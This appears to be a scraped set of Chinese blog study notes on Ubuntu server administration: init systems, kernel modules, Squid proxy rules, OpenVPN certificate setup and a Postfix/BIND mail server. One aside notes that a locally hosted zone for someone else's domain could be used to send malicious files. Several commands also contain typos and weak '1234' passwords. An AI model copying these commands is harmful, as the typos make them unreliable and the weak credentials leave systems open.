powerwait 系统关闭时才运行，系统将等待其运行完成 respawn 进入运行级时启动，并在终止时重新启动（病毒可以这样，你杀掉之后过一会又会起来） sysinit 在boot和bootwait项之前启动 wait 进程启动一次，系统等待其完成 查看系统运行级 runlevel # 显示之前和现在的运行级 N 5 # 上面命令的执行结果 # N 表示系统【之前】处于原始boot运行级 # 5 表示【当前】运行级 更改运行级 init 6 # 重启系统(teljinit) init 0 # 关机 # init的问题在于命令立刻生效。这对个人电脑没有问题，但对多用户环境有影响（可能造成其他用户也...） # 多用户环境，建议使用shutdown、halt、 poweroff、 reboot (时间、通知) ## 接受别人给发的通知 mesg y # 开启 mesg # 查看 who -T # 第二列终端前面如果有+号，表示他允许别人给他发消息 write xps tty1 # 给指定用户在某个指定的终端发送消息 #运行后直接写消息就行 wall xxxxxxx # 给所有登录用户发消息（广播） Upstart 操作系统的复杂度不断上升，造成SysV脚本越来越复杂 ubuntu官方开发Upstart用于替换SysV 处理可热插拔设备在Linux系统中造成的动态环境 使用公钥/etc/init/文件夹替代/etc/inittab 和/etc/init.d 中的启动脚本 每个程序和服务在init文件夹中都有一个\u003cprogram_name\u003e.conf配置文件 启动和停止服务 sudo start/stop bluetooth # ubuntu中没有 Linux Standard Base (LSB) 是一些Linux发行版协商共同支持的规范 目的是在不同Linux发行版之间创建一 致的使用体验 LSB定义了标准的init命令:·start、 stop、 restart 所有遵循L SB的Linux发行版都应该支持以上命令 但是Debian等发行方退出了LSB组织，目前ubuntu中不包含 lsb_release -a # Linux世界可能会日趋分裂，统一用户体验的缺失势必提高用户的学习成本 Sytemd(目前最主流) 由RedHat开发，并迅速流行于Linux世界 Systemd 在系统初始化的方式上引入了一个主要的范式转换，并引起了一些争议 它放弃使用多 个小型初始化脚本，转而使用单一程序，配合每个服务独立的配置文件 这违背了早期的Linux哲学(小而专著是性能、稳定、安全性的基础) 放弃了初始化脚本和运行级，Systemd创造了target / unit的概念 unit用来定义service、action 由名称、类型、配置文件组成 常见unit类型 automount、 device、 mount、 path、 service、 snapshot、 socket、 target 等等 unit的命名方式 name.type # 如sshd.service 当前系统已加载的unit systemctl list- -units # 查看 Systemd 使用service类型的unit 管理后台服务 target 类型组合多个unit实现同时启动 例如network.target组合了所有用于启动网卡的unit 系统初始化过程中，target 类似于SysV中运行级别的概念 一个target对应- -组service 配置unit 每个unit需要一个配置文件来定义需要启动、如何启动什么程序 配置文件路径/lib/systemd/system/，不同版本，路径不尽相同 cat /lib/systemd/system/ssh.service ExecStart #指定运行程序 After #依赖的服务(先于ssh服务运行的程序) WantedBy #指定target (运行级) Restart #何时重启 tartget配置文件 定义需要启动的unit(不定义具体程序) # 以graphical为例 cat /lib/systemd/system/graphical.target 默认target # 系统引导后默认启动的target(default.target) /lib/systemd/system/default.target -\u003e graphical.target # 只需对目标做个软链接 systemctl程序 # 常用参数 list-unites / start / stop / restart / reload /status / enable / disable #计算机每次引导时启动/禁用 isolate #启动指定单元(停止其他所有单元) default #修改默认target 兼容SysV # 对应的运行级别 /lib/ systemd/system/runlevel0.target # poweroff.target /lib/ systemd/ system/ runlevel1.target # rescue.target /lib/ systemd/ system/ runlevel5.target # graphical.target /lib/ systemd/ system/ runlevel6.target # reboot.target # 比如，进入到运行级别1 systemctl isolate runlevel1 ","date":"2020-07-30","objectID":"/ubuntu-server-%E5%BC%95%E5%AF%BC%E8%BF%87%E7%A8%8B/:4:0","tags":["Linux","ubuntu","引导过程","BIOS","UEFI","grub","内核"],"title":"ubuntu server-引导过程","uri":"/ubuntu-server-%E5%BC%95%E5%AF%BC%E8%BF%87%E7%A8%8B/"},{"categories":["Linux"],"content":"内核 Linux系统组成 Linux内核 GNU系统工具 图形化桌面环境 应用软件 内核控制计算机软硬件 由L inus Torvalds(当年是赫尔辛基大学的学生)创造， 直到目前为止的负责人(Linux Foundation) 操作系统的核心功能 管理系统的内存 管理软件程序 管理硬件 管理文件系统 如何安装内核(其不同的组成部分)？ 如何创建新内核(支持新硬件和软件特性)？ 如何管理内核及内核模块？ 内存管理 在系统的内存容量限制下，控制程序如何运行 除管理物理内存，操作系统还负责创建和管理虚拟内存 虚拟内存并非真实存在，它利用硬盘空间创建并当作真实内存使用(SWAP) 内核将一段时间不活跃的内容页转储到SWAP，并在需要时重新读入物理内存 Swapping out机制使系统认为自己拥有更多可用的内存空间(降低性能) 内存空间被分组到称为内存页的块中 内核定位物理内存或交换空间中的每个内存页 内核维护内存页表，登记哪些页位于物理内存/SWAP 查看虚拟内存 cat / proc/ meminfo # 运行实时的数据 # MemTotal: 2048000 kB # 物理内存 MemFree: 438123 kB # 空闲 MemAvilable 3580848 KB # 实际可用的空间 SwapTotal: 2048000 kB # SwapFree: 2048000 kB Linux系统每个进程的内存彼此独立 不同进程无法互访彼此内存空间，内核负责维护这种约束 没有其他进程可以访问内核使用的内存空间 共享内存页 内核可创建共享的内存区域，供多进程共享数据，内核负责验证和准入进程 查看当前系统共享内存页 ipcs -m # 结果字段： owner #创建此共享内存段的帐号 perms #共享权限 key #允许其他用户访问此内存段 软件程序管理 运行中的程序称为进程 内核控制所有进程运行(前台运行、后台运行) 初始化进程(init) 负责启动所有其他进程 内核每启动一个进程，都在内存中为其分配独享的一段内存区域存放数据、代码 查看当前进程 ps ps -ax # 建议加参数 ## 显示的字段含义 # PID：进程ID # STAT：进程状态(Sleep、 Sleep and Wait、Run) # [process] swapping out 带放括号的都是放到虚拟内存中的 硬件管理 与系统通信的所有硬件都需要将驱动植入内核 内核编译同时包含硬件驱动(早期唯一方法) 驱动程序以内核模块型式加载 内核模块是一个自包含的驱动程序库，可动态与内核链接/取消链接 Linux系统的三种硬件设备文件 1. 字符设备文件: 一次只能处理一个字符数据的设备(调制解调器、终端) c 2. 块设备文件: 一次能处理一大块数据的设备(硬盘) b 3. 网络设备文件:使用包来发送和接收数据的设备(网卡) Linux为系统上的每个硬件设备创建称为节点的特殊文件 内核通过唯一的数字对标识每个节点(主、次) 同类型设备主节点号相同，同一主节点号下，次节点号唯一 cd /dev \u0026\u0026 ls -al sd* ttyS* # 结果显示 brw-rw---- 1 root disk 8, 0 12月5 15:14 sda # 8，0 主设备标识/次设备标识 brw-rw---- 1 root disk 8, 1 12月5 15:14 sda1 brw-rw---- 1 root disk 8, 16 12月5 15:14 sdb brw-rw---- 1 root disk 8, 17 12月5 15:14 sdb1 crw- -rW---- 1 root uucp 4, 64 12月5 15:14 ttyS0 crw-rw---- 1 root uucp 4, 65 12月5 15:14 ttyS1 文件系统管理 文件系统定义OS如何在存储设备上存储数据 分区、格式化 Linux 支持包括Windows在内的众多文件系统 内核统一使用Virtual File System (VFS) 与不同文件系统进行交互 内核的文件构成 内核二进制文件 内核程序本身，BootLoader加载到内存中执行的内容(位于/boot或/中) 基于编译打包的驱动数量不同，内核=进制文件可能很大 内核二进制文件通常被压缩，以便加载内核时节省内存空间 压缩方式不同，将导致内核二进制文件名称差异 不同的Linux内核文件 备注 bzimage （常用）GNU zip压缩的大内核，常被拷贝为4(vmlinuz) kernel 未压缩 vmlinux 未压缩，通常不用作最终的引导版本 vmlinuz 通用的压缩文件（如ubuntu下：vmlinuz-4.15.0-65-generic） zimage 使用GNU zip压缩的小内核 内核模块 内核直接与硬件交互 内核与硬件通信需要驱动程序的支持 将硬件驱动和内核的源码一并编译成二进制执行文件(体积大) 将驱动编译为二进制的模块对象文件.ko， 运行时动态链接 硬件驱动的发布 源码：开源精神 二进制文件：保护隐私、功能特性 内核模块(modprob) /lib/modules/\u003cversion\u003e/kernel/*.ko 内核源码 获得 Linux内核开发库(www.kernel.org –\u003e 稳定版、开发版) 对应Linux发行版的软件库(对本发行版最稳妥，下载方便) 下载源码解压至/usr/src/linux (内核工具默认查找路径) 链接到指定版本 /usr/src/linux-5.3.12 # 维护多个版本 /usr/src/kernels # Redhat 内核补丁 针对bug修复和安全补丁的增量内核发行版 内核补丁版本(针对主版本的补丁) 只包含应用于主内核源代码发行版以获得增量发行版的更改(5.3 –\u003e 5.3.1) 使用patch命令将补丁源码包应用于主源码包，然后重新编译 后续补丁版本(5.3.1 -\u003e 5.3.2) 卸载早期版本补丁(patch -R) patch新版本补丁 重新编译 内核头 Linux内核绝大部分使用C语言编写 - C语言头文件:编译时需要的库文件 - 编译内核、模块都需要相同的内核头(库文件) Ubuntu内核头 sudo apt install linux-headers-4.15.0-72-generic /usr/src/linux-headers-4.1 5.0-72-generic/include/config/*.h # ubuntu /usr/src/kernels # Redhat # 不同发行版路径不同 # 查看使用的内核版本 uname -r 内核文档 许多独立的文本文件，说明每个源代码文件在内核结构中的作用 针对内核源码做任何操作之前，建议详细阅读文档 由于文档体量巨大，通常以独立包形式发布 文档路径 /usr/src/linux/Documentation # Ubuntu /usr/src/kernels # Redhat 内核版本 七个内核版本命名方式(系统) Linus于1991年9月发布了初始Linux内核版本号0.01 0表示该版本目的是测试，并非生产环境使用(延用至0.95 – 1 992.3) 1994年3月，Linus 发布了Linux 的第一个生产版本1.0 (1.x.y) x主版本号(奇数表示测试/开发版本；偶数表示稳定/生产版本) y主版本下的补丁版本 此版本号延用至 1.3 (1995.5) 1.3之后Linux内核变化很大，因此下一个版本为2.0 (1996.6) 2.x.y延用1.x.y 的命名方式，直至2.4 (2001.1) 2003.12 Linus发布2.6.0版本，启动了一个新的版本命名系统 由于2.6内核非常稳定，因此新内核版本格式为2.6.x.y（不再通过奇偶数来区分稳定与否） 2.6 每个版本都是生产版本(开发版结尾为-rc) 此版本延用至2.6.39 (2011.5) 2011.7 Linus为庆祝Linux内核20岁生日，启动了内核的3.0版本 3.x.y (开发版在结尾加-rc) -直延用至3.19 (2015.2) 3.x.y-z 临时特殊补丁版(主要与紧急的安全修复有关) 2015.4发布4.0版本 4.x.y (与3.0相同) 4.x.y-z (y的第z次微调版本) 2019.3发布5.0版本 目前最新，命名延用以前 查看内核版本 uname -r 维护内核 手动编译内核(较少使用，忽略) 使用发行版包管理器维护内核（建议的方式） 模块文件 /lib/modules/version/kermel/*.ko 手动编译内核模块，当升级内核时需要重新编译模块 Dynamic Kernel Module Support (DKMS) 注册自定义模块后，dkms监视内核变化，并自动运行脚本重新编译安装模块 常用模块命令 # 已安装模块列表 lsmod # 模块之间存在依赖关系 # 查看模块详细信息 modinfo bluetooth # 比如查看蓝牙模块的信息 # 安装/删除模块 insmod / rmmod # 需指定'完整'内核模块文件路径(依赖模块未加载时失败) modprobe -r # 或者这种方式安装，只需指定模块名，自动安装依赖（比较友好） 内核排错 查看内核版本 uname -r # -a显示全部信息 /proc目录 # Linux内核创建的动态伪目录 # 在内核运行时查看内核相关的配置、性能 # 包含硬件信息 /proc/interrupt","date":"2020-07-30","objectID":"/ubuntu-server-%E5%BC%95%E5%AF%BC%E8%BF%87%E7%A8%8B/:5:0","tags":["Linux","ubuntu","引导过程","BIOS","UEFI","grub","内核"],"title":"ubuntu server-引导过程","uri":"/ubuntu-server-%E5%BC%95%E5%AF%BC%E8%BF%87%E7%A8%8B/"},{"categories":["Linux"],"content":" 你看见的不是你真的看见的 时间、带宽、管控都影响网络使用体验 作为改善技术，VPN/代理和突破限制改善体验 区别：代理主要提高访问速度；VPN更注重安全性 在某些应用场景中，作用非常相似 作为中间层，双向模拟（翻墙） 【访问者】 –\u003e 【中间层】 –\u003e 【目标】 ","date":"2020-07-17","objectID":"/ubuntu-server-%E4%BB%A3%E7%90%86-vpn/:0:0","tags":["ubuntu","代理","VPN"],"title":"ubuntu server-代理\u0026VPN","uri":"/ubuntu-server-%E4%BB%A3%E7%90%86-vpn/"},{"categories":["Linux"],"content":"代理(Proxy) 网络代理服务 客户端访问请求发给Proxy，而非直连目标 代理转发请求给目标，并将结果返回给客户 正向代理 提高速度、内容控制、安全 （代替正常用户来访问资源） 反向代理 速度、安全、分发 （代替一个代理服务器接收资源，转发给后面的代理服务器，然后把后面代理服务器资源分发给用户。比如Nginx反向代理） 安全性：反向代理服务器上可以进行安全性过滤，比如waf等 Squid 全面的一个代理软件 用squid实现正向代理 1.安装squid sudo apt install squid 2.配置 vim /etc/squid/squid.conf # 主配置文件 # acl：访问控制列表/资源列表 acl localnet src 192.168.0.0/16 # 先配置内部网段，指定源地址，只给这个网段做代理 acl menhu111 dstdomain .sina.com .sina.com.cn .163.com # 目标域名，多个以空格分隔。小心页面元素CSS、图片(有些资源不属于那个域的下面) acl xiaban111 time MTWHFAS 18:00-23:59 # 定义时间，下班时间，MTWHFAS（周1-7），不限制访问。是服务器本地时间 # Mon, Tues, Wednes, tHurs, Fri, sAtur, Sun, D: 工作日 acl noexes url_regex -i \\.exe$ # URL以exe结尾（-i大小写不敏感） acl httpsurls url_regex -i ^https # 以 ^URL起始 acl noporn url_regex -i sex # acl zipfiles url_regex -i \\.zip$ # http访问规则顺序匹配（按前后顺序执行） # 原则：【禁止规则】一定要放在【允许规则】前面 http_access deny !Safe_ports # 不是Safe_ports的端口，都禁止 http_access deny noexes noporn # 原则：【禁止规则】一定要放在【允许规则】前面 http_access deny CONNECT !SSL_ports # 如果不是SSL_ports的端口，如果发起Connect请求的话，也是禁止的 http_access allow localhost # 允许所有人请求我代理服务器的本地 http_access allow localnet menhu111 xiaban111 # 允许本地地址访问后面指定的目标域名 http_access allow localhost manager # 缓存到代理服务器本地 http_access deny manager http_access deny all # 除了上面明确允许的，其他的一概禁止(这条规则要放到最后面) # http_access allow all 3.修改完之后，重新加载配置文件 sudo kill -SIGHUP `cat /var/run/squid.pid` 默认侦听3128代理端口，在配置文件可以修改 http_port 3128 # 默认侦听所有网卡的所有3128端口,建议不要对公网开放代理 # 指定侦听网卡 http_port 192.168.0.1:3128 访问日志 access_log daemon:/var/log/squid/access.log squid 缓存 cache_dir ufs /var/spool/squid3 100 16 256 # 缓存路径，多大，周期 refresh_pattern -i \\.(gif|png|jpg|jpeg|ico)$ 3600 90% 86400 # 缓存图片 ","date":"2020-07-17","objectID":"/ubuntu-server-%E4%BB%A3%E7%90%86-vpn/:1:0","tags":["ubuntu","代理","VPN"],"title":"ubuntu server-代理\u0026VPN","uri":"/ubuntu-server-%E4%BB%A3%E7%90%86-vpn/"},{"categories":["Linux"],"content":"VPN 原理 企业内部系统不应对外开放 出差在外的企业员工需要访问公司内部系统 分公司、合作商需要安全的访问指定企业内部系统 专线网络费用高昂且不灵活 远程访问安全性欠缺 虚拟专用网(VPN – Virtual Private Network) 基于并不安全的网络线路，通过加密技术构建安全的信息通道（tunnel） VPN用户获得如同在内网一样的访问使用体验 与Proxy相比 VPN更加安全、成本高、部署难度大 VPN一旦部署完成后简单使用 Proxy属于一种中间层，VPN更接近路由（对应用透明，无需设置代理） VPN更完善的认证、加密、授权控制 VPN类型 PPTP L2TP（用的少） IPSec（保密性要求很高，过于复杂。常用于网络边界之间） SSL（非常适合终端用户） OPenVPN 全特性的开源SSL VPN 跨平台 Windows、Linux、macox、ios、android OpenVPN 通过非受信网络连接上网时保证安全 出差员工访问企业内部系统 伪装为国外地址，规避地理限制和审核（翻墙） 需要（独立的）证书颁发机构CA，完成PKI架构 安装\u0026配置 一台VPN服务器，一台CA服务器（每个服务器只做一个用途） 题外话：ubuntu server 1804修改主机名之前，先把/etc/cloud/cloud.conf配置文件中修改为的preserve_hostname修改为true，然后再修改hostname和hosts 1.安装OpenVPN（在VPN Server） sudo apt install openvpn 2.安装EasyRSA(在VPN Server+ 在CA Server) # ubuntu软件源也有，但是不是最新的，这里去github下载最新的 # ca server 和vpn server都需要下载EasyRSA(一个作为客户端一个作为服务端) wget https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.6/EasyRSA-unix-v3.0.6.tgz tar -xvf EasyRSA-unix-v3.0.6.tgz 3.配置安装（在CA服务器上） cd ~/EasyRSA-v3.0.6/ cp vars.example vars #vim vars set_var EASYRSA_REQ_COUNTRY \"CN\" set_var EASYRSA_REQ_PROVICE \"BJ\" set_var EASYRSA_REQ_CITY \"BJ\" set_var EASYRSA_REQ_ORG LAB\"\" set_var EASYRSA_REQ_EMAIL \"admin@lab.com\" set_var EASYRSA_REQ_OU \"IT\" # 初始化PKI架构 ./easyrsa init-pki # 会创建一个pki的目录，以后生成的证书会在这个目录下，证书的私钥会在这个目录下的privte下，证书申请文件会在这个目录下的reqs下 4.创建证书颁发机构，生成CA公私钥（在CA Server） ./easyrsa build-ca nopass #证书私钥文件的访问密码，但是这里不设置 # 下面设置证书的名字，默认不改 # ca.crt 公钥证书，用于验证CA前面的其他证书（C/S都需要） # ca.key CA的私钥，用于前面所有C/S证书（应私密保存） # 证书服务器在不使用时，建议关机 5.生成VPN服务器私钥和证书申请文件（在VPN Server） cd EasyRSA-v3.0.6/ ./easyrsa init-pki # 只是初始化PKI架构 ./easyrsa gen-req vpnserver nopass # 生成证书申请文件，起个名字，设置密码 # pki/reqs/vpnserver.req # pki/private/vpnsenver.key # 私钥文件要好好保存 sudo cp pki/private/vpnserver.key /etc/openvpn # 拷贝私钥文件 # 将证书请求文件传输至CA签发 scp pki/reqs/vpnserver.req xps@CA_IP:/tmp 6.导入并签发VPN服务器证书（在CA Server） ./easyrsa import-req /tmp/vpnserver.req vpnserver # 导入，加一个名字 ./easyrsa sign-req vpnserver vpnserver # 签发， pki/issued/vpnserver.crt # 证书类型 server / client ## 将证书回传至vpnserver scp pki/issued/vpnserver.crt xps@vpnserver_IP:/tmp/ # vpnserver证书 scp pki/ca.crt xps@vpnserver_IP:/tmp/ # CA公钥证书（自建的证书，要想被信任，必须获得ca服务器的公钥） 7.拷贝证书文件（在vpnserver） sudo cp /tmp/{vpnserver.crt, sa.crt} /etc/openvpn # 生成Diffie-Hellman密钥（密钥交换） ./easyrsa gen-dh # 生成HMAC签名（TLS完整性校验） dh.pem openvpn --genkey --secret ta.key # 生成安全密钥 sudo cp ta.key /etc/openvpn/ sudo cp pki/dh.pem /etc/openvpn/ # 服务端证书设置全部完成 8.客户端证书（在VPN Server） # 客户端也要证书来证明自己的身份 ## 在 VPN服务器上生成客户端证书 ## 使用脚本批量自动生成客户端配置文件 ## 生成客户端证书密钥 / 请求文件 mkdir -p ~/client-configs/keys # 证书文件目录 chmod -R 700 ~/client-configd # 配置文件目录 cd ~/EasyRSA-v3.0.6/ ./easyrsa gen-req client_1 nopass # client_1 cp pki/private/client_1.key ~/client-configs/keys/ scp pki/reqs/client_1.req xps@CA_IP:/tmp/ # 证书的请求文件 9.导入并签发证书（在CA Server） ./easyrsa import-req /tmp/client_1.key client_1 # 导入 ./easyrsa sign-req client client_1 # 签发（证书类型，证书column name） scp pki/issued/client_1.crt xps@vpnserver_IP:/tmp/ 10.复制证书文件（在VPN Server） cp /tmp/client_1.crt ~/client-configs/keys/ cp ~/EasyRSA-v3.0.6/ta.key ~/client-configs/keys/ sudo cp /etc/openvpn/ca.crt ~/client-configs/keys/ 客户端证书文件准备完毕，下面步骤都是在VPN服务器上配置 11.vpn服务器配置文件 sudo cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz /etc/openvpn/ sudo gzip -d /etc/openvpn/server.conf.gz sudo vim /etc/openvpn/server.conf # 配置文件，根据自己的情况来修改 tls-auth ta.key 0 key-direction 0 cipher AES-256-CBC auth SHA256 dh dh.pem user nobody group nogroup ; 下面，强制客户端【所有】流量路由到tun0（我的vpn隧道） push \"redirect-gateway def1 bypass-dhcp\" push \"dhcp-option DNS 202.106.8.20\" push \"dhcp-option DNS 8.8.8.8\" ; DNS服务器可设多个 ;端口和协议 port 443 proto tcp ；如果用TCP的1194，就无需这条 explicit-exit-notify 0 ;指定服务器证书文件 cert vpnserver.crt key vpnserver.key 12.启动服务器路由功能 sudo vim /etc/sysctl.conf net.opv4.ip_forward = 1 sudo sysctl -p 13.确认默认路由网卡名称 ip route |grep default default via 192.168.8.2 dev enp0s3 proto static 14.修改防火墙规则实现NAT # 连上我的vpn之后，都把我的地址转换为路由绑定网卡的内网的地址，隐藏原本的地址 sudo vim /etc/ufw/before.rules # 优先级高于普通UFW规则 # START OPENVPN RULES *nat :POSTROUTING A","date":"2020-07-17","objectID":"/ubuntu-server-%E4%BB%A3%E7%90%86-vpn/:2:0","tags":["ubuntu","代理","VPN"],"title":"ubuntu server-代理\u0026VPN","uri":"/ubuntu-server-%E4%BB%A3%E7%90%86-vpn/"},{"categories":["Linux"],"content":" 直到今天，Emai仍然是互联网上最重要的信息传递方式之一 ","date":"2020-07-11","objectID":"/ubuntu-server-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/:0:0","tags":["邮件服务","ubuntu server"],"title":"ubuntu sever-邮件服务","uri":"/ubuntu-server-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":" 电子邮件基础 快速、便捷、通用、异步通信方式 1965年最早由MIT发明并开源（最早用于不同主机用户间通信） 1971年确定邮件地址以@符号连接（在不同主机之间传递信息） MIME类型扩展邮件从纯文本到传递文件（文档、图片、媒体） 邮件可被伪造，邮件炸弹，垃圾邮件 传统物理邮件： 写信-\u003e到本地邮局-\u003e目的邮局-\u003e收件人 电子邮件 Client1 -\u003e Server1 -\u003e Server2 -\u003e Client2 （邮件地址通过DNS解析完成邮件路由） 无收件人返回报错（不通知），连不上目标服务器周期重发（直至失败） SMTP（Simple Mail Transfer Protocol） MTA(Mail transfer agents) 之间通信协议（SMTPD） 由很多小程序实现MTA所有功能 Sendmai、Postfix、Exim、Qmail 客户端发起邮件 MUA -\u003e MTA 也是用SMTP协议 MTA(Mail Transfer Agent) 常见的MTA软件： 1. Sendmial 一个MTA软件包 处理着绝大多数互联网电子邮件 开源免费版 / 商业版（GUI页面） 配置过于复杂（默认配置已经可以良好工作） 功能全面但性能不占优势 2. Postfix 来自于IBM的开源MTA（Ubuntu默认首选MTA） 速度优于Sendmail，配置管理更简单（配置文件、命令） 可以平滑替换Sendmail（模块化） 3. Qmail Postfix的可替代选择（模块化的MTA，用户、配置相分离） 设计初衷是实现取代Sendmail的更安全快速的MTA 从Sendmail迁移到Qmail过程复杂 众多插件，包含WebMail、POP服务 4. Exim 比Sendmail、Postfix更安全快速，但配置方式不同 与Qmail都使用maildir格式邮箱存储 邮箱存储 MBOX 传统的mbox格式邮箱存储将所有邮件存于一个文件中（索引定位具体邮件） 文件和索引损坏可能造成邮件丢失，故障恢复困难 不适于存储于NFS挂载目录中 MAILDIR Maildir格式包含三个子目录/cur,/new,/tmp， 每个邮件分隔独立保存 可并行访问，性能更高（mbox不支持） 可用NFS作为邮箱存储 MTA可直接投递和读取文件 更多时候邮件投递由MDA完成 MDA(Mail Delivery Agent, 邮件投递代理) MDA比MTA额外实现自动过滤、回复、规则转存、杀毒等 但邮件的收还是靠MTA 常见的MDA软件： 1. Mailx MDA + MUA（Ubuntu的默认MDA） 来自MTA的邮件交给Mailx投递到用户邮箱（/var/mail/） 主目录下：.forward文件实现自动转发（如：公司邮箱的邮件，通过.forward进行转发到私人邮箱） 2. main.local 常用于BSD的MDA程序 功能使用与Mailx类似 3. procmail 最流行的MDA之一 Recipes允许用户自定义邮件处理脚本（.procmailrc） MUA(Mail User Agent) 读取和展示邮箱中的邮件（不金慈宁宫邮件传递） 在哪读邮件/邮件显示格式（MIME） 常见类型的MUA： 1.Mailx MUA + MDA 服务器本地直接读取邮箱mail 2.Dovecot 远程客户端访问邮箱 POP3(Post Office Protocol version 3) 适合单一客户端，单项通信协议(MUA \u003c- MDA) IMAP4(Internet Message Access Protocol 4) 适合多邮件客户端，双项同步协议( MUA \u003c–\u003e MDA) 最基本的：MTA+MDA+MUA 典型命令： 3. 其他邮箱访问方式 Web Mail WAPI（ 微软专有邮箱协议） 4. Fetchmail 自己本地邮箱服务器 \u003c- 运行商邮件服务器(POP3 / IMAP) 适用于每月稳定互联网连接的小公司 ","date":"2020-07-11","objectID":"/ubuntu-server-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/:1:0","tags":["邮件服务","ubuntu server"],"title":"ubuntu sever-邮件服务","uri":"/ubuntu-server-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"电子邮件架构 邮件结构 信封：用于邮件路由，对用户透明不可见 邮件头：邮件路由传输过程的记录日志（如果遇到不专业的小黑客，可以通过邮件头来溯源） 邮件体：邮件要传递的具体内容 SPAM 垃圾邮件，不请自来的邮件（Junk） 处理浪费时间、网络带宽、存储空间 病毒、木马、蠕虫、钓鱼邮件 包含恶意附件、链接、伪装、诈骗内容 存在安全风险，谨慎打开陌生邮件 邮件规范 收件人为事件直接相关人（其他相关人作为抄送人） 次要相关人按职位顺序 CC(抄送人，收件人能看见我发给抄送人，按职位顺序排列)、BCC（密送人，收件人是不知道我发给密送人了） 主题简介清晰，高度概括（切忌把正文具体内容写到主题） 保证表述清楚的前提下邮件内容尽可能短（避免语法错误），不要使用模棱两可/时髦语言 适当使用表情符 回复、转发完整邮件流（禁止单独新写邮件作为回复） 压缩附件 附个人签名（公司的信息，职位，姓名 -\u003e 或弄成二维码-\u003e不太建议，建议直接用文本形式） 沟通是所有企业面对的最大问题 ","date":"2020-07-11","objectID":"/ubuntu-server-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/:2:0","tags":["邮件服务","ubuntu server"],"title":"ubuntu sever-邮件服务","uri":"/ubuntu-server-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"Postfix简单部署 MTA(能发出邮件最关键的组件) 1.先安装DNS服务器 sudo apt install bind9 2.配置 # sudo vim /etc/bind/named.conf.options # 自己解析不了的域名，转发给互联网上其他的 forwarders { 8.8.8.8; } # sudo vim /etc/bind/named.conf.local # 自己的域(可以是任何域名，虽然被别人占用的。可以用来发送恶意文件) zone \"qq.com\"{ type master; file \"/etc/bind/db.qq.com\"; # 区域文件 } # cp /etc/bind/db.local.local # sudo vim /etc/bind/db.qq.com $TTL 604800 @ IN SOA ns.qq.com. root.qq.com. ( 2 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ; @ IN NS ns # 创建NS记录 @ IN MX 5 mail # 创建MX记录，优先级(值越大，优先级越低) ns IN A 192.168.0.19 # NS的记录 mail IN A 192.168.0.19 # MX的记录 pop IN A 192.168.0.19 imap IN A 192.168.0.19 smtp IN A 192.168.0.19 @ IN A 192.168.0.19 # @代表本域域名自己 3.重启bind服务 sudo systemctl restart bind9 4.网络配置（配置静态ip） # sudo vim /etc/netplan/50-cloud-init.yaml dhcp4:no addresses:[192.168.1.2/24] gateway4:192.168.1.1 nameservers: search:[qq.com] addresses:[192.168.1.2] # 指向邮箱服务器的ip sudo netplan apply sudo networkctrl status 5.修改主机名 #sudo vim /etc/hostname mail.qq.com # 直接修改hostname后，重启后会变回去，所以修改下面的配置文件 #sudo vim /etc/cloud/cloud.cfg preserve_hostname:true 6.安装Postfix sudo apt install postfix 向导窗口，选择： Internet Site # 一般选这个就好 Internet Site smarthost # 智能主机 操作系统的主机名 # mail.qq.com grep mail /etc/group # 会自动生成一个用户组mail grep postfix /etc/group # 会自动生成一个用户组postfix # 但是postfix默认使用操作系统的用户，要加入本地用户到相应组(只有该用户组的成员才可发邮件) sudo usermod -aG mail xps # sudo useradd -m -G mail xxx2 # sudo passwd xxx2 # mail # mail命令默认不安装，先安装 sudo apt install mailutils # 安装 mail # 再使用 mail xps@qq.com # 主要收件人 cc: xps2@163.com # 抄送人 Subject: test2 # 主题 xxxxxx正文 # ctrl + D 发送邮件 su xxx2 # 切换到该用户查看该用户收到的邮件 mail # 可以查看该用户收到的邮件 单机邮件一般存在/var/mail/用户名 # 一般大的邮箱服务商，如QQ，163等，会反查发件人邮件的地址是否是合法的 目前，只能发邮件，不能收邮件 ","date":"2020-07-11","objectID":"/ubuntu-server-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/:3:0","tags":["邮件服务","ubuntu server"],"title":"ubuntu sever-邮件服务","uri":"/ubuntu-server-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"企业级Postfix邮件系统部署 组件 Postfix: MTA Dovecot: POP /IMAP服务 SASL: 身份认证 Postfixadmin: 管理邮件、虚拟域、别名等的WEB应用 LEMP：Postfixadmin的web环境依赖 Postfix的两种域 Local Domain：为本系统账号投递邮件(/etc/passwd) Virtual Domain：为非本系统账号投递邮件 1.安装LEMP sudo apt install nginx sudo apt install mysql-server sudo mysql_secure_installation sudo mysql ALTER USER 'root'@'localhost' INDETIFIED WITH mysql_native_password BY '1234'; # 修改登录方式 FLUSH PROVILEGES; # mysql -u root -p1234 sudo apt install php-fpm php-mysql sudo vim /etc/php/7.2/fpm/php.ini cgi.fix_pathinfo=0 date.timezone = Asia/Shanghai ## 验证能否正常使用 sudo vim /etc/nginx/sites-avaliable/default index index.php server_name mail.qq.com; location ~\\.php${ include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; } location ~/.ht{ deny all; } sudo vim /var/www/html/info.php \u003c?php phpinfo(); ?\u003e systemctl restart nginx.service systemctl restart php7.2-fmp.service 2.安装Postfixadmin 推荐手动下载源码，然后解压 # 安装依赖包 sudo apt install php-imap php-mbstring php7.2-imap php7.2-mbstring # 下载源码 sudo wget -P /opt https://github.com/postfixadmin/postfixadmin/archive/postfixadmin-3.2.4.tar.gz cd /opt \u0026\u0026 tar -xvf postfixadmin-3.2.tar.gz mv postfixadmin-postfixadmin3.2/ postfixadmin # /opt/postfixadmin/public/setup.php # 做web界面配置的文件 # 软链接目录 ln -s /opt/postfixadmin/public/ /var/www/html/pfa 3.配置数据库 # mysql -u root -p # 创建数据库和名字 CREATE DATABASE postfix_db; CREATE USER 'post_user'@'localhost' IDENTIFIED BY '1234'; GRANT 